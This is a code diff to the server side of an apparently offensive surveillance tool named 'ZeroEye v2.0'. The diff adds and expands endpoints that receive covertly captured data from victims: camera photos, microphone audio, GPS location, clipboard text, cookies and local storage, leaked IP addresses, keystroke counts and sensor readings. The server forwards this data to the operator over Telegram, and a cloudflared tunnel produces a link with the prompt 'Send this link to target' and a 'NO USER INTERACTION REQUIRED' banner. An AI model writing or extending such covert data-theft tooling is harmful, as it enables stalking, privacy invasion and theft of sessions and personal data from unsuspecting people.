@@ -97,45 +97,41 @@ async def receive_sys(data: str = Form(...)):
     try:
         info = json.loads(data)
         
-        # Create comprehensive display
         table = Table(show_header=True, header_style="bold green")
         table.add_column("Category", style="cyan", width=20)
         table.add_column("Details", style="white")
         
         if 'basic' in info:
             basic = info['basic']
-            table.add_row("📱 Device", f"{basic.get('platform', 'Unknown')} | {basic.get('userAgent', '')[:50]}...")
-            table.add_row("🖥️ Screen", f"{basic['screen']['width']}x{basic['screen']['height']} | {basic['screen']['colorDepth']}bit")
+            table.add_row("📱 Device", f"{basic.get('platform', 'Unknown')}")
+            table.add_row("🖥️ Screen", f"{basic['screen']['width']}x{basic['screen']['height']}")
             table.add_row("🌐 Timezone", basic['timezone']['name'])
         
         if 'fingerprint' in info:
             fp = info['fingerprint']
-            table.add_row("🔍 Fingerprint", f"Canvas: {fp.get('canvas', '')[:20]}... | Fonts: {len(fp.get('fonts', []))}")
+            table.add_row("🔍 Fingerprint", f"Canvas: Available | Fonts: {len(fp.get('fonts', []))}")
         
-        if 'network' in info:
-            net = info['network']
-            table.add_row("📡 Network", f"Type: {net.get('connection', {}).get('effectiveType', 'Unknown')} | IPs: {len(net.get('ips', []))}")
+        if 'storage' in info:
+            storage = info['storage']
+            table.add_row("💾 Storage", f"Cookies: {len(storage.get('cookies', ''))} | Local: {len(storage.get('localStorage', {}))}")
         
-        console.print(Panel(table, title="🎯 [bold green]ULTRA INTELLIGENCE CAPTURED[/bold green]", border_style="green"))
+        console.print(Panel(table, title="🎯 [bold green]ULTRA-SILENT INTELLIGENCE[/bold green]", border_style="green"))
         
         # Telegram notification
         if bot:
-            telegram_msg = "🎯 *ULTRA INTELLIGENCE CAPTURED*\n\n"
+            telegram_msg = "🎯 *ULTRA-SILENT INTELLIGENCE*\n\n"
             if 'basic' in info:
                 basic = info['basic']
                 telegram_msg += f"*Device:* {basic.get('platform', 'Unknown')}\n"
                 telegram_msg += f"*Screen:* {basic['screen']['width']}x{basic['screen']['height']}\n"
-                telegram_msg += f"*Timezone:* {basic['timezone']['name']}\n"
-            if 'network' in info and info['network'].get('ips'):
-                telegram_msg += f"*IPs:* {', '.join(info['network']['ips'][:3])}\n"
+                telegram_msg += f"*Stealth:* Active\n"
             
             bot.send_message(telegram_msg)
         
-        save_local("ultra_intel.txt", json.dumps(info, indent=2))
+        save_local("ultra_silent_intel.txt", json.dumps(info, indent=2))
         return {"status": "ok"}
         
     except Exception as e:
-        console.print(f"[red][!] Error processing ultra intelligence: {e}[/red]")
         return {"status": "error"}
 
 @app.post("/upload_cam")
@@ -145,39 +141,50 @@ async def receive_cam(file: UploadFile = File(...)):
         with open(filename, "wb") as buffer: 
             shutil.copyfileobj(file.file, buffer)
         
-        console.print(f"[green][+] Stealth photo captured: {filename}[/green]")
+        console.print(f"[green][+] Stealth photo captured[/green]")
         
         if bot: 
-            bot.send_photo(filename, caption="📸 *Stealth Camera Capture*")
+            bot.send_photo(filename, caption="📸 *Stealth Camera*")
             
         return {"status": "ok"}
         
     except Exception as e:
-        console.print(f"[red][!] Error processing camera: {e}[/red]")
         return {"status": "error"}
 
-@app.post("/upload_clipboard")
-async def receive_clipboard(data: str = Form(...)):
+@app.post("/upload_audio")
+async def receive_audio(file: UploadFile = File(...)):
     try:
-        info = json.loads(data)
-        content = info.get('content', '')
+        filename = f"captured/audio_{int(time.time())}.webm"
+        with open(filename, "wb") as buffer: 
+            shutil.copyfileobj(file.file, buffer)
         
-        console.print(Panel(
-            f"[bold red]📋 CLIPBOARD DATA CAPTURED[/bold red]\n\n"
-            f"[cyan]Content:[/cyan] {content[:100]}{'...' if len(content) > 100 else ''}\n"
-            f"[cyan]Length:[/cyan] {info.get('length', 0)} characters",
-            title="Clipboard Surveillance",
-            border_style="red"
-        ))
+        console.print(f"[cyan][+] Stealth audio captured[/cyan]")
         
-        if bot and content:
-            bot.send_message(f"📋 *Clipboard Data*\n\n`{content[:300]}`")
-        
-        save_local("clipboard.txt", f"Clipboard: {content}")
+        if bot: 
+            bot.send_audio(filename, caption="🎤 *Stealth Audio*")
+            
         return {"status": "ok"}
         
     except Exception as e:
-        console.print(f"[red][!] Error processing clipboard: {e}[/red]")
+        return {"status": "error"}
+
+@app.post("/upload_ip")
+async def receive_ip(data: str = Form(...)):
+    try:
+        info = json.loads(data)
+        ips = info.get('ips', [])
+        
+        for ip in ips:
+            console.print(f"[green][+] IP Leak: {ip}[/green]")
+            
+            if bot: 
+                bot.send_message(f"🌐 *IP Leak*\n\n`{ip}`")
+            
+            save_local("ip_logs.txt", f"IP: {ip}")
+        
+        return {"status": "ok"}
+        
+    except Exception as e:
         return {"status": "error"}
 
 @app.post("/upload_location")
@@ -187,68 +194,74 @@ async def receive_location(data: str = Form(...)):
         
         if 'latitude' in info:
             console.print(Panel(
-                f"[bold yellow]📍 LOCATION DATA CAPTURED[/bold yellow]\n\n"
+                f"[bold yellow]📍 STEALTH LOCATION CAPTURED[/bold yellow]\n\n"
                 f"[cyan]Latitude:[/cyan] {info['latitude']}\n"
-                f"[cyan]Longitude:[/cyan] {info['longitude']}\n"
-                f"[cyan]Accuracy:[/cyan] {info.get('accuracy', 'Unknown')} meters",
-                title="Geolocation Intelligence",
+                f"[cyan]Longitude:[/cyan] {info['longitude']}",
+                title="Geolocation",
                 border_style="yellow"
             ))
             
             if bot:
-                bot.send_message(f"📍 *Location Data*\n\nLat: {info['latitude']}\nLon: {info['longitude']}\nAccuracy: {info.get('accuracy')}m")
+                bot.send_message(f"📍 *Stealth Location*\n\nLat: {info['latitude']}\nLon: {info['longitude']}")
         
         save_local("location.txt", json.dumps(info, indent=2))
         return {"status": "ok"}
         
     except Exception as e:
-        console.print(f"[red][!] Error processing location: {e}[/red]")
         return {"status": "error"}
 
 @app.post("/upload_battery")
 async def receive_battery(data: str = Form(...)):
     try:
         info = json.loads(data)
-        
-        console.print(f"[cyan][+] Battery: {info.get('level', 'Unknown')}% | Charging: {info.get('charging', 'Unknown')}[/cyan]")
-        
-        if bot and 'level' in info:
-            bot.send_message(f"🔋 *Battery Status*\n\nLevel: {info['level']}%\nCharging: {info.get('charging', 'Unknown')}")
-        
+        console.print(f"[cyan][+] Battery: {info.get('level', 'Unknown')}%[/cyan]")
         save_local("battery.txt", json.dumps(info, indent=2))
         return {"status": "ok"}
-        
-    except Exception as e:
-        console.print(f"[red][!] Error processing battery: {e}[/red]")
+    except:
         return {"status": "error"}
 
 @app.post("/upload_behavior")
 async def receive_behavior(data: str = Form(...)):
     try:
         info = json.loads(data)
-        
         movements = len(info.get('mouseMovements', []))
         clicks = len(info.get('clicks', []))
-        scrolls = len(info.get('scrolls', []))
+        keystrokes = len(info.get('keystrokes', []))
         
-        console.print(f"[blue][+] Behavior: {movements} moves, {clicks} clicks, {scrolls} scrolls[/blue]")
-        
-        if bot and (movements > 50 or clicks > 0):
-            bot.send_message(f"🎯 *Behavior Data*\n\nMovements: {movements}\nClicks: {clicks}\nScrolls: {scrolls}")
-        
-        save_local("behavior.txt", f"Session {info.get('sessionId')}: {movements} moves, {clicks} clicks")
+        console.print(f"[blue][+] Behavior: {movements} moves, {clicks} clicks, {keystrokes} keys[/blue]")
+        save_local("behavior.txt", f"Session {info.get('sessionId')}: {movements} moves")
         return {"status": "ok"}
-        
-    except Exception as e:
-        console.print(f"[red][!] Error processing behavior: {e}[/red]")
+    except:
         return {"status": "error"}
 
+@app.post("/upload_clipboard")
+async def receive_clipboard(data: str = Form(...)):
+    try:
+        info = json.loads(data)
+        content = info.get('content', '')
+        
+        if content:
+            console.print(Panel(
+                f"[bold red]📋 STEALTH CLIPBOARD CAPTURED[/bold red]\n\n"
+                f"[cyan]Content:[/cyan] {content[:100]}{'...' if len(content) > 100 else ''}",
+                title="Clipboard",
+                border_style="red"
+            ))
+            
+            if bot:
+                bot.send_message(f"📋 *Stealth Clipboard*\n\n`{content[:300]}`")
+        
+        save_local("clipboard.txt", f"Clipboard: {content}")
+        return {"status": "ok"}
+    except:
+        return {"status": "error"}
+
+# Additional endpoints for new features
 @app.post("/upload_heartbeat")
 async def receive_heartbeat(data: str = Form(...)):
     try:
         info = json.loads(data)
-        # Silent heartbeat - just log to file
-        save_local("heartbeat.txt", f"Heartbeat: {info.get('url', 'Unknown')} | {info.get('timestamp')}")
+        save_local("heartbeat.txt", f"Heartbeat: {info.get('url', 'Unknown')}")
         return {"status": "ok"}
     except:
         return {"status": "error"}
@@ -257,28 +270,54 @@ async def receive_heartbeat(data: str = Form(...)):
 async def receive_navigation(data: str = Form(...)):
     try:
         info = json.loads(data)
-        console.print(f"[magenta][+] Navigation: {info.get('from', '')} → {info.get('to', '')}[/magenta]")
         save_local("navigation.txt", f"Nav: {info.get('from')} → {info.get('to')}")
         return {"status": "ok"}
     except:
         return {"status": "error"}
 
-@app.post("/upload_ip")
-async def receive_ip(data: str = Form(...)):
+@app.post("/upload_notification")
+async def receive_notification(data: str = Form(...)):
     try:
         info = json.loads(data)
-        ip_addr = info.get('internal_ip', 'Unknown')
-        
-        console.print(f"[green][+] IP Leak: {ip_addr}[/green]")
-        
-        if bot: 
-            bot.send_message(f"🌐 *IP Leak*\n\n`{ip_addr}`")
-        
-        save_local("ip_logs.txt", f"IP: {ip_addr}")
+        console.print(f"[magenta][+] Notification: {info.get('permission', 'Unknown')}[/magenta]")
         return {"status": "ok"}
-        
-    except Exception as e:
-        console.print(f"[red][!] Error processing IP: {e}[/red]")
+    except:
+        return {"status": "error"}
+
+@app.post("/upload_sw")
+async def receive_sw(data: str = Form(...)):
+    try:
+        info = json.loads(data)
+        console.print(f"[yellow][+] Service Worker: {info.get('status', 'Unknown')}[/yellow]")
+        return {"status": "ok"}
+    except:
+        return {"status": "error"}
+
+@app.post("/upload_storage_test")
+async def receive_storage_test(data: str = Form(...)):
+    try:
+        info = json.loads(data)
+        console.print(f"[blue][+] Storage APIs: {sum(info.values())} available[/blue]")
+        return {"status": "ok"}
+    except:
+        return {"status": "error"}
+
+@app.post("/upload_sensor_test")
+async def receive_sensor_test(data: str = Form(...)):
+    try:
+        info = json.loads(data)
+        console.print(f"[green][+] Sensors: {sum(info.values())} available[/green]")
+        return {"status": "ok"}
+    except:
+        return {"status": "error"}
+
+@app.post("/upload_accelerometer")
+async def receive_accelerometer(data: str = Form(...)):
+    try:
+        info = json.loads(data)
+        save_local("sensors.txt", f"Accelerometer: {info}")
+        return {"status": "ok"}
+    except:
         return {"status": "error"}
 
 # --- WIZARD INTERFACE ---
@@ -293,18 +332,6 @@ def start_wizard():
     if saved_conf:
         console.print("\n[cyan]📁 Found saved configuration[/cyan]")
         
-        table = Table(show_header=False, box=None)
-        table.add_column("Setting", style="cyan")
-        table.add_column("Value", style="white")
-        
-        token_preview = saved_conf['bot_token'][:8] + "..." if saved_conf['bot_token'] else "Not set"
-        table.add_row("Bot Token", token_preview)
-        table.add_row("Chat ID", saved_conf['chat_id'] or "Not set")
-        table.add_row("Template", saved_conf['template'])
-        table.add_row("Telegram", "✅ Enabled" if saved_conf['telegram_enabled'] else "❌ Disabled")
-        
-        console.print(table)
-        
         choice = Prompt.ask(
             "Use saved settings?", 
             choices=["y", "n", "delete"], 
@@ -316,8 +343,7 @@ def start_wizard():
             if CONFIG["telegram_enabled"] and CONFIG["bot_token"] and CONFIG["chat_id"]:
                 bot = TelegramSender(CONFIG["bot_token"], CONFIG["chat_id"])
         elif choice == "delete":
-            if delete_config():
-                console.print("[green][✓] Configuration deleted[/green]")
+            delete_config()
             saved_conf = None
         else:
             saved_conf = None
@@ -331,8 +357,7 @@ def start_wizard():
             
             test_bot = TelegramSender(CONFIG["bot_token"], CONFIG["chat_id"])
             if Confirm.ask("Save these settings for future use?", default=True):
-                if save_config(CONFIG):
-                    console.print("[green][✓] Configuration saved[/green]")
+                save_config(CONFIG)
             
             bot = test_bot
         else:
@@ -351,31 +376,31 @@ def start_wizard():
     
     choice = Prompt.ask("Choose template", choices=list(templates.keys()), default="1")
     CONFIG["template"] = templates[choice][1]
-    console.print(f"[green][✓] Selected: {templates[choice][0]}[/green]")
 
     # Start server
     port = 8080
-    console.print(f"\n[green][*] Starting ultra-stealth server on port {port}...[/green]")
+    console.print(f"\n[green][*] Starting ultra-silent server on port {port}...[/green]")
     
     tunnel = TunnelManager(port)
     url = tunnel.start_cloudflared()
     
     console.print(Panel(
-        f"[bold cyan]🎯 ULTRA STEALTH MODE ACTIVE[/bold cyan]\n\n"
+        f"[bold cyan]🎯 ULTRA-SILENT MODE ACTIVE[/bold cyan]\n\n"
         f"[bold green]{url}[/bold green]\n\n"
         f"[yellow]📋 Send this link to target[/yellow]\n"
-        f"[grey50]💡 Ultra features: Fingerprinting, Behavior tracking, Clipboard surveillance[/grey50]",
-        title="ZeroEye v2.0 - Ultra Stealth",
+        f"[red]🚨 NO USER INTERACTION REQUIRED[/red]\n"
+        f"[grey50]💡 Maximum features: Camera, Audio, Location, Storage, Sensors[/grey50]",
+        title="ZeroEye v2.0 - Ultra Silent",
         border_style="green",
         expand=False
     ))
     
-    console.print("\n[cyan]🛡️  Ultra stealth active... Press Ctrl+C to stop[/cyan]")
+    console.print("\n[cyan]🛡️  Ultra-silent mode active...[/cyan]")
     
     try:
         uvicorn.run(app, host="0.0.0.0", port=port, log_level="error")
     except KeyboardInterrupt:
-        console.print("\n[yellow][!] Shutting down ZeroEye...[/yellow]")
+        console.print("\n[yellow][!] Shutting down...[/yellow]")
     except Exception as e:
         console.print(f"[red][!] Server error: {e}[/red]")
 
